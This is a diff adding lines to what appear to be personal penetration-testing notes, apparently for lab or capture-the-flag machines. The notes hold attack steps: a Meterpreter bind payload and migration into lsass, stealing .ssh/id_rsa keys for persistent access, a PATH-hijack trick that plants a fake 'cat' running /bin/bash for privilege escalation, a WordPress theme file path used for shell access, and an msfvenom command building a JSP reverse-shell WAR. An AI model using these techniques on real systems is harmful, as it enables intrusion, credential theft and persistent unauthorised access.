@@ -31,3 +31,17 @@
 	- set PAYLOAD windows/meterpreter/bind_tcp
 - Always migrate to explorer.exe or lsass 
 	- ps -S lsass.exe
+- always look for .ssh/id_rsa for persistence access
+- cross check internal Ips with nmap (only if possible to transfer nmap binary)
+- 10.10.10.10/wordpress/wp-content/themes/twentytwenty/404.php
+- if a file have 'cat /root/something', you can 
+	- which cat
+	- cd /tmp/
+	- echo '/bin/bash' > cat
+	- chmod +x cat
+	- echo $PATH
+	- if /tmp not there
+		- export PATH=/tmp:$PATH
+
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
+- 
